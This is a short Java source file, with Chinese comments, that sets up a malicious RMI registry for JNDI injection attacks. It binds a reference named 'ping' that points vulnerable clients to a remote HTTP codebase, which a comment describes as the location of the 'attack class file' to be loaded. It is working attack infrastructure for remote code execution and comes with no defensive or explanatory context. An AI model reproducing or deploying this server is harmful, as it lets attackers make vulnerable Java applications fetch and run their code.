import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.rmi.AlreadyBoundException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.RMISocketFactory;
import java.util.concurrent.CountDownLatch;

/**
 * rmi远程服务器需开启1099、10990端口
 */
public class Server {
    private static CountDownLatch count = new CountDownLatch(1);
    public static void main(String[] args) throws IOException, NamingException, AlreadyBoundException, InterruptedException {
        System.setProperty("java.rmi.server.hostname", "ip");

        //注册端口
        Registry registry = LocateRegistry.createRegistry(1099);
        RMISocketFactory.setSocketFactory(new RMISocketFactory() {
            @Override
            public Socket createSocket(String host, int port) throws IOException {
                return new Socket(host, port);
            }

            @Override
            public ServerSocket createServerSocket(int port) throws IOException {
                if (port == 0) {
                    port = 10990;
                }
                return new ServerSocket(port);
            }
        });

        //factoryLocation  存放攻击class文件的路径
        Reference reference = new Reference("Attach", "Attach", "http://ip:8080/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);

        //rmi的访问地址
        registry.bind("ping", referenceWrapper);
        count.await();
    }
}
